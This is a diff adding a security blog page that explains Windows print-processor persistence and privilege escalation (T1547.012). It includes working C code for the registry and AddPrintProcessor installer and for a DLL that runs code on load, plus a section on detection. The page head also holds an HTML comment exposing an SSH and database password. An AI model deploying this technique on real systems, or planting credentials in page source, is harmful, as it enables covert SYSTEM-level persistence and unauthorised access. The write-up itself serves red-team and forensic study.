@@ -1,0 +1,311 @@
+<!DOCTYPE html> <html lang="en">
+	<head>
+	<meta charset="utf-8"/>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<link rel="apple-touch-icon" sizes="180x180" href="/assets/favico/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/assets/favico/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/assets/favico/favicon-16x16.png">
+	<link rel="manifest" href="/assets/favico/site.webmanifest">
+	<link rel="mask-icon" href="/assets/favico/safari-pinned-tab.svg" color="#5bbad5">
+	<meta name="msapplication-TileColor" content="#da532c">
+	<meta name="theme-color" content="#ffffff">
+	<!-- SSH and DB password: Password123 -->
+<meta property="og:title" content="Persistence and Privilege Escalation on Windows via Print Processors" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Persistence and Privilege Escalation on Windows via Print Processors" />
+<meta property="og:description" content="Persistence and Privilege Escalation on Windows via Print Processors" />
+<meta property="twitter:description" content="Persistence and Privilege Escalation on Windows via Print Processors" />
+<link rel="canonical" href="https://stmxcsr.com/persistence/print-processor.html" />
+<meta property="og:url" content="https://stmxcsr.com/persistence/print-processor.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-14T18:17:37+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Persistence and Privilege Escalation on Windows via Print Processors" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-12-14T18:17:37+00:00","datePublished":"2024-12-14T18:17:37+00:00","description":"Persistence and Privilege Escalation on Windows via Print Processors","headline":"Persistence and Privilege Escalation on Windows via Print Processors","mainEntityOfPage":{"@type":"WebPage","@id":"https://stmxcsr.com/persistence/print-processor.html"},"url":"https://stmxcsr.com/persistence/print-processor.html"}</script>
+<title>Persistence and Privilege Escalation on Windows via Print Processors | stmxcsr</title><link rel="stylesheet" type="text/css" href="/assets/css/main-dark.css">
+	</head>
+	<body>
+		<div class="container">
+			
+		<header>
+			<nav>
+			<a href="/">/home</a>
+			<a href="/categories/">/categories</a>
+			<a href="/tutorials/">/tutorials</a>
+			<a href="/micro/">/microblogs</a>
+			<a href="/about/">/about</a>
+			<a href="/contact/">/contact</a>
+			</nav>
+		</header>
+
+			<main><h1 id="persistence-and-privilege-escalation-on-windows-via-print-processors">Persistence and Privilege Escalation on Windows via Print Processors</h1>
+
+<p>This article demonstrates a persistence and/or privilege escalation tehcnique documented as “Print Processors” T1547.012 in the MITRE ATT&amp;CK [<a href="https://attack.mitre.org/techniques/T1547/012/">1</a>] framework. It has been used in many attacks by Advanced Persistent Threats (APTs) such as Winnti [<a href="https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/">3</a>], [<a href="https://www.crowdstrike.com/blog/in-depth-analysis-of-the-ccleaner-backdoor-stage-2-dropper-and-its-payload/">6</a>] and Gelsemium [<a href="https://www.welivesecurity.com/2021/06/09/gelsemium-when-threat-actors-go-gardening/">4</a>], [<a href="https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf">5</a>]. The privilege escalation allows an attacker escalate from High integrity (Administrator) to System integrity (NT AUTHORITY\SYSTEM). Particularly interesting is the fact that it was used in the CCleaner [<a href="https://www.crowdstrike.com/blog/in-depth-analysis-of-the-ccleaner-backdoor-stage-2-dropper-and-its-payload/">6</a>] supply-chain attack. Direct or indirect references to this technique can also be found in [<a href="https://www.hexacorn.com/blog/2019/05/26/plata-o-plomo-code-injections-execution-tricks/">7</a>] and [<a href="https://www.welivesecurity.com/wp-content/uploads/200x/white-papers/The_Evolution_of_TDL.pdf">2</a>].</p>
+
+<p>This write-up aims to assist Red Teams reproduce this technique in Simulated Attack engagements and demonstrate impact. It is useful from a DFIR perspective as it gives a little more context to investigators.</p>
+
+<p>The article is layed out in the following sections:</p>
+
+<ul>
+  <li><a href="#review-of-the-technique">Review of the technique</a></li>
+  <li><a href="#print-processor-installation-source-code">Print Processor Installation Source Code</a></li>
+  <li><a href="#print-processor-dll-source-code">Print Processor DLL Source Code</a></li>
+  <li><a href="#detection-opportunities">Detection Opportunities</a></li>
+  <li><a href="#tools">Tools</a></li>
+  <li><a href="#references">References</a></li>
+</ul>
+
+<h2 id="review-of-the-technique">Review of the technique</h2>
+
+<p>To perform this technique, the following are required:</p>
+
+<ul>
+  <li>a registry key that points to the print processor has to be created in <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\%ARCHITECTURE%\Print Processors\</code> (the path is architecture specific)</li>
+  <li>a call to <em>GetPrintProcessorDirectory</em> [<a href="https://docs.microsoft.com/en-us/windows/win32/printdocs/getprintprocessordirectory">8</a>] to get the suitable directory for the print processor (architecture-specific)</li>
+  <li>a call to <em>AddPrintProcessor</em> to register the print processor</li>
+  <li>the print processor (implemented in a DLL) has to export [10] the functions: <em>EnumPrintProcessorDatatypesW</em>, <em>OpenPrintProcessor</em>, <em>PrintDocumentOnPrintProcessor</em>, <em>ClosePrintProcessor</em>, <em>ControlPrintProcessor</em> and <em>GetPrintProcessorCapabilities</em></li>
+</ul>
+
+<p>To confirm what functions Print Spooler calls, Rohitab’s ApiMonitor shows the APIs:</p>
+
+<p><img src="/assets/printproc/print_processor.png" alt="print_proc" class="image-location" /></p>
+
+<h2 id="print-processor-installation-source-code">Print Processor Installation Source Code</h2>
+
+<p>The following code creates the required keys and values in <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\</code> and calls the <em>AddPrintProcessor</em> [<a href="https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor">9</a>] API to register the print processor.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">INT</span> <span class="nf">CreateRegistryKeyPrintProcessor</span><span class="p">(</span><span class="n">WCHAR</span><span class="o">*</span> <span class="n">lpData</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// lpData : DLL name</span>
+	<span class="n">LSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+	<span class="n">WCHAR</span> <span class="n">lpSubKey</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"SYSTEM</span><span class="se">\\</span><span class="s">CurrentControlSet</span><span class="se">\\</span><span class="s">Control</span><span class="se">\\</span><span class="s">Print</span><span class="se">\\</span><span class="s">Environments</span><span class="se">\\</span><span class="s">Windows x64</span><span class="se">\\</span><span class="s">Print Processors</span><span class="se">\\</span><span class="s">printprocessor"</span><span class="p">;</span>
+	<span class="n">HKEY</span> <span class="n">phkResult</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">DWORD</span> <span class="n">dwDisposition</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">status</span> <span class="o">=</span> <span class="o">::</span><span class="n">RegCreateKeyExW</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="n">lpSubKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">REG_OPTION_NON_VOLATILE</span><span class="p">,</span> <span class="n">KEY_CREATE_SUB_KEY</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phkResult</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwDisposition</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] RegCreateKeyExW has failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">::</span><span class="n">GetLastError</span><span class="p">());</span>
+		<span class="k">return</span> <span class="n">status</span><span class="p">;</span>
+	<span class="p">}</span>
+	
+	<span class="n">phkResult</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">status</span> <span class="o">=</span> <span class="o">::</span><span class="n">RegOpenKeyExW</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="n">lpSubKey</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phkResult</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] RegOpenKeyW has failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">::</span><span class="n">GetLastError</span><span class="p">());</span>
+		<span class="k">return</span> <span class="n">status</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">WCHAR</span> <span class="n">lpValueName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"Driver"</span><span class="p">;</span>
+	<span class="n">status</span> <span class="o">=</span> <span class="o">::</span><span class="n">RegSetKeyValueW</span><span class="p">(</span><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">,</span> <span class="n">lpSubKey</span><span class="p">,</span> <span class="n">lpValueName</span><span class="p">,</span> <span class="n">REG_SZ</span><span class="p">,</span> <span class="n">lpData</span><span class="p">,</span> <span class="n">wcslen</span><span class="p">(</span><span class="n">lpData</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] RegSetKeyValueW has failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">::</span><span class="n">GetLastError</span><span class="p">());</span>
+		<span class="k">return</span> <span class="n">status</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">status</span> <span class="o">=</span> <span class="o">::</span><span class="n">RegCloseKey</span><span class="p">(</span><span class="n">phkResult</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">status</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] RegCloseKey has failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">::</span><span class="n">GetLastError</span><span class="p">());</span>
+		<span class="k">return</span> <span class="n">status</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">status</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="nf">PrintProcessorPersistence</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">BOOL</span> <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="n">WCHAR</span> <span class="n">pPathName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"printprocessor.dll"</span><span class="p">;</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="n">CreateRegistryKeyPrintProcessor</span><span class="p">(</span><span class="n">pPathName</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">res</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] CreateRegistryKeyPrintProcessor has failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">WCHAR</span> <span class="n">pEnvironment</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"Windows x64"</span><span class="p">;</span>
+	<span class="n">DWORD</span> <span class="n">pcbNeeded</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">GetPrintProcessorDirectoryW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">pEnvironment</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcbNeeded</span><span class="p">);</span>
+
+	<span class="n">WCHAR</span><span class="o">*</span> <span class="n">pPrintProcessorInfo</span> <span class="o">=</span> <span class="n">new</span> <span class="n">WCHAR</span><span class="p">[</span><span class="n">pcbNeeded</span><span class="p">];</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="n">GetPrintProcessorDirectoryW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">pEnvironment</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="n">pPrintProcessorInfo</span><span class="p">,</span> <span class="n">pcbNeeded</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pcbNeeded</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] GetPrintProcessorDirectory has failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="c1">//::wprintf(L"[+] pPrintProcessorInfo: %s\n", pPrintProcessorInfo);</span>
+
+	<span class="c1">// AddPrintProcessor</span>
+	<span class="n">WCHAR</span> <span class="n">pPrintPRocessorName</span><span class="p">[]</span> <span class="o">=</span> <span class="s">L"Test Processor"</span><span class="p">;</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="n">AddPrintProcessorW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">pEnvironment</span><span class="p">,</span> <span class="n">pPathName</span><span class="p">,</span> <span class="n">pPrintPRocessorName</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] AddPrintProcessor has failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">INT</span> <span class="nf">wmain</span><span class="p">(</span><span class="n">INT</span> <span class="n">argc</span><span class="p">,</span> <span class="n">WCHAR</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">BOOL</span> <span class="n">res</span> <span class="o">=</span> <span class="n">PrintProcessorPersistence</span><span class="p">();</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="o">::</span><span class="n">wprintf</span><span class="p">(</span><span class="s">L"[-] PrintProcessorPersistence has failed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="print-processor-dll-source-code">Print Processor DLL Source Code</h2>
+
+<p>The DLL that implements the Print Processor has to export a number of functions [<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/print/functions-defined-by-print-processors">10</a>]. As soon as the DLL is loaded in the address space of <em>spoolsv.exe</em>, the function <em>EnumPrintProcessorDatatypesW</em> is executed.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="cp">#define DllExport __declspec(dllexport)
+</span>
+<span class="k">extern</span> <span class="s">"C"</span> <span class="n">DllExport</span> <span class="n">BOOL</span> <span class="nf">ClosePrintProcessor</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hPrintProcessor</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">extern</span> <span class="s">"C"</span> <span class="n">DllExport</span> <span class="n">BOOL</span> <span class="nf">ControlPrintProcessor</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hPrintProcessor</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">Command</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="nf">EnumPrintProcessorDatatypesW</span><span class="p">(</span><span class="n">LPWSTR</span> <span class="n">pName</span><span class="p">,</span> <span class="n">LPWSTR</span> <span class="n">pPrintProcessorName</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">Level</span><span class="p">,</span> <span class="n">LPBYTE</span> <span class="n">pDatatypes</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">cbBuf</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">pcbNeeded</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">pcReturned</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="c1">// executes when DLL is loaded</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">extern</span> <span class="s">"C"</span> <span class="n">DllExport</span> <span class="n">DWORD</span> <span class="nf">GetPrintProcessorCapabilities</span><span class="p">(</span><span class="n">LPTSTR</span> <span class="n">pValueName</span><span class="p">,</span>	<span class="n">DWORD</span> <span class="n">dwAttributes</span><span class="p">,</span>	<span class="n">LPBYTE</span> <span class="n">pData</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">nSize</span><span class="p">,</span> <span class="n">LPDWORD</span> <span class="n">pcbNeeded</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">_PRINTPROCESSOROPENDATA</span> <span class="p">{</span>
+	<span class="n">PDEVMODE</span> <span class="n">pDevMode</span><span class="p">;</span>
+	<span class="n">LPWSTR</span>   <span class="n">pDatatype</span><span class="p">;</span>
+	<span class="n">LPWSTR</span>   <span class="n">pParameters</span><span class="p">;</span>
+	<span class="n">LPWSTR</span>   <span class="n">pDocumentName</span><span class="p">;</span>
+	<span class="n">DWORD</span>    <span class="n">JobId</span><span class="p">;</span>
+	<span class="n">LPWSTR</span>   <span class="n">pOutputFile</span><span class="p">;</span>
+	<span class="n">LPWSTR</span>   <span class="n">pPrinterName</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">PRINTPROCESSOROPENDATA</span><span class="p">,</span> <span class="o">*</span> <span class="n">PPRINTPROCESSOROPENDATA</span><span class="p">,</span> <span class="o">*</span> <span class="n">LPPRINTPROCESSOROPENDATA</span><span class="p">;</span>
+
+<span class="k">extern</span> <span class="s">"C"</span> <span class="n">DllExport</span> <span class="n">HANDLE</span> <span class="nf">OpenPrintProcessor</span><span class="p">(</span><span class="n">LPWSTR</span> <span class="n">pPrinterName</span><span class="p">,</span>	<span class="n">PPRINTPROCESSOROPENDATA</span> <span class="n">pPrintProcessorOpenData</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="mi">11</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">extern</span> <span class="s">"C"</span> <span class="n">DllExport</span> <span class="n">BOOL</span> <span class="nf">PrintDocumentOnPrintProcessor</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hPrintProcessor</span><span class="p">,</span> <span class="n">LPWSTR</span> <span class="n">pDocumentName</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">PayloadFunction</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="c1">// debug</span>
+	<span class="n">CHAR</span> <span class="n">msgbuf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
+	<span class="n">sprintf_s</span><span class="p">(</span><span class="n">msgbuf</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="s">"[+] PayloadFunction was called"</span><span class="p">);</span>
+	<span class="o">::</span><span class="n">OutputDebugStringA</span><span class="p">(</span><span class="n">msgbuf</span><span class="p">);</span>
+	
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">hinstDLL</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">fdwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="k">switch</span> <span class="p">(</span><span class="n">fdwReason</span><span class="p">)</span>
+	<span class="p">{</span>
+	<span class="k">case</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+		<span class="n">PayloadFunction</span><span class="p">();</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="k">case</span> <span class="n">DLL_THREAD_ATTACH</span><span class="p">:</span>
+	<span class="k">case</span> <span class="n">DLL_PROCESS_DETACH</span><span class="p">:</span>
+	<span class="k">case</span> <span class="n">DLL_THREAD_DETACH</span><span class="p">:</span>
+		<span class="k">break</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="detection-opportunities">Detection Opportunities</h2>
+
+<p>Events to monitor that could potentially indicate suspicious activity are:</p>
+
+<ul>
+  <li>API calls to <em>AddPrintProcessor</em></li>
+  <li>File write events to ‘C:\Windows\system32\spool\PRTPROCS\x64'</li>
+  <li>Registry key creation in <code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\</code></li>
+</ul>
+
+<p>With the aforementioned indicators in mind, hunting can be implemented in Windows environments. Non-default print processors installed in a small number of hosts within an estate should be analyzed.</p>
+
+<p>Additionally, for those familiar with VirusTotal Enterprise platform, the following search modifiers [<a href="https://support.virustotal.com/hc/en-us/articles/360001385897-File-search-modifiers">11</a>] will likely return malware Print Processor DLLs:</p>
+
+<blockquote>
+  <p>type:pedll exports:”EnumPrintProcessorDatatypesW” positives:30+</p>
+</blockquote>
+
+<p>The above query looks for the exported function <em>EnumPrintProcessorDatatypesW</em> in DLL files that have 30 or more detections by antivirus engines. As mentioned earlier, there are a number (actually six) funtions that should be exported to successfully implement this technique and therefore additional function names can be used in the search.</p>
+
+<h2 id="tools">Tools</h2>
+
+<ul>
+  <li>Visual Studio</li>
+  <li>Rohitab’s ApiMonitor</li>
+  <li>SysInternals DebugView</li>
+  <li>SysInternals ProcMon</li>
+</ul>
+
+<h2 id="references">References</h2>
+
+<p>[1] https://attack.mitre.org/techniques/T1547/012/</p>
+
+<p>[2] https://www.welivesecurity.com/wp-content/uploads/200x/white-papers/The_Evolution_of_TDL.pdf</p>
+
+<p>[3] https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/</p>
+
+<p>[4] https://www.welivesecurity.com/2021/06/09/gelsemium-when-threat-actors-go-gardening/</p>
+
+<p>[5] https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf</p>
+
+<p>[6] https://www.crowdstrike.com/blog/in-depth-analysis-of-the-ccleaner-backdoor-stage-2-dropper-and-its-payload/</p>
+
+<p>[7] https://www.hexacorn.com/blog/2019/05/26/plata-o-plomo-code-injections-execution-tricks/</p>
+
+<p>[8] https://docs.microsoft.com/en-us/windows/win32/printdocs/getprintprocessordirectory</p>
+
+<p>[9] https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor</p>
+
+<p>[10] https://docs.microsoft.com/en-us/windows-hardware/drivers/print/functions-defined-by-print-processors</p>
+
+<p>[11] https://support.virustotal.com/hc/en-us/articles/360001385897-File-search-modifiers</p>
+<br>
+				tags: 
+					
+						<a href="/categories/persistence">#persistence</a>
+					
+				
+			</main>
+			<footer>View the software <a href="/license.html">license</a> agreement</footer>
+
+		</div>
+	</body>
+</html>
